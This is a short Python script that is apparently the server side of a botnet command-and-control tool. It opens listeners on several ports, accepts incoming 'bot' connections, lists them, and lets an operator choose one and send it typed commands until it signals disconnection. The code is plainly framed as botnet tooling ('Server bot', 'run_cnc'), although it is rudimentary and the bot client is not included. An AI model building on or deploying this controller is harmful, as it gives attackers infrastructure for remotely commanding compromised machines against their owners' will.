import socket
from threading import Thread
import time

threads = []
clients = []


def listen_for_bots(port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind(("", port))
    sock.listen()
    bot, bot_address = sock.accept()
    clients.append(bot)



def main():

    print("[+] Server bot waiting for incoming connections")
    
    startig_port = 8085
    
    bots = 3

    for i in range(bots):
        t = Thread(target=listen_for_bots, args=(i + startig_port,), daemon=True)
        threads.append(t)
        t.start()
    # bot, bot_address = s.accept()
    run_cnc = True
    while run_cnc:
        if len(clients) != 0:
            for i, c in enumerate(clients):
                print("\t\t", i, "\t", c.getpeername())

            selected_client = int(input("[+] Select client by index: "))
            bot = clients[selected_client]
            run_bot = True
            while run_bot:
                msg = input("[+] Enter Msg: ")
                msg = msg.encode()
                bot.send(msg)
                if msg.decode() == "exit":
                    run_bot = False
            status = bot.recv(1024)
            if status == "disconnected".encode():
                bot.close()
                clients.remove(bot)
            

            print("data sent")
        else:
            print("[+] No clients connected")
            ans = input("[+] Do you want to exit? press [y/n]  ")
            if ans == "y":
                run_cnc = False
            else:
                run_cnc = True

if __name__ == "__main__":

    main()